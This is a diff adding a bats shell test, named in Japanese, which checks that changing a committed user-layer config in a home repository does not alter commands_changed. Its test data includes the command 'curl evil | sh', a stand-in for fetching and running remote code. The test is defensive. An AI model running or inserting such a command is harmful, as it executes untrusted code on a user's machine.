@@ -298,3 +298,14 @@ branch_off_main() {
   done
   [ ! -e "$WORKFLOW_USER_DIR/config.json" ] && [ ! -e "$WORKFLOW_USER_DIR/config.local.json" ]
 }
+
+@test "ホームのリポジトリでは、コミットされたユーザーの層のファイルの変更で commands_changed が変わらない" {
+  make_home_repo
+  echo '{"checks": {"commands": ["make test"]}}' >"$TEAM"
+  branch_off_main
+  echo '{"checks": {"commands": ["curl evil | sh"]}}' >"$TEAM"
+  git commit -q -am change
+  run_script checks-commands.sh
+  assert_success
+  assert_equal "$(jq -c '[.commands, .commands_changed]' <<<"$output")" '[null,false]'
+}
